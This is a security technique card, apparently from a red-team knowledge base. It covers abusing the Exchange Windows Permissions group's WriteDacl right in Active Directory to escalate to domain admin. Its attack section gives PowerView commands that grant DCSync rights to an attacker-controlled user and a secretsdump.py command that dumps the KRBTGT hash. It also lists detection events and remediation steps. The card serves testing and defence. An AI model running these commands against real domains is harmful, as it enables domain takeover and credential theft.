# [PE-VALID-001]: Exchange Server ACL Abuse

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-001 |
| **MITRE ATT&CK v18.1** | [Domain Policy Modification (T1484)](https://attack.mitre.org/techniques/T1484/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** When Microsoft Exchange is installed in a domain, it creates a group called `Exchange Windows Permissions`. By default, this group has `WriteDacl` permissions on the Domain object. Any user who is a member of this group (or can compromise an Exchange Server, which is a member of `Exchange Trusted Subsystem`, which is a member of `Exchange Windows Permissions`) can grant themselves `DCSync` rights (Replicating Directory Changes).
- **Attack Surface:** AD ACLs (Domain Object).
- **Business Impact:** **Domain Compromise**. Elevating from an Exchange Admin or compromised Exchange Server to Domain Admin.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Compromised Exchange Server (Local System) or membership in Organization Management.
- **Tools:**
    - [PowerView](https://github.com/PowerShellMafia/PowerSploit)
    - [Exchange-AD-Privesc](https://github.com/gdedrouas/Exchange-AD-Privesc)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Check Membership**
Verify if the current user/computer is in the privileged group.
```powershell
Get-DomainGroupMember "Exchange Windows Permissions"
```

**Step 2: Add DCSync Rights (PowerView)**
Grant `DCSync` to an attacker-controlled user (`bob`).
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity "bob" -Rights DCSync
```

**Step 3: Execute DCSync**
Dump the KRBTGT hash.
```bash
secretsdump.py corp.local/bob:pass@DC01 -just-dc-user krbtgt
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 AD Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Security** | 5136 | Directory Service Change. Object: `DC=domain`. Attribute: `nTSecurityDescriptor`. Actor: Exchange Machine Account. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Remove WriteDacl:** Run the Microsoft-provided script or manually remove the `WriteDacl` permission for `Exchange Windows Permissions` on the Domain object.
*   **Tiering:** Treat Exchange Servers as Tier 0 assets (same security as Domain Controllers).

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-EXPLOIT-001] (Exchange RCE)
> **Next Logical Step:** [CA-UNSC-001] (DCSync)
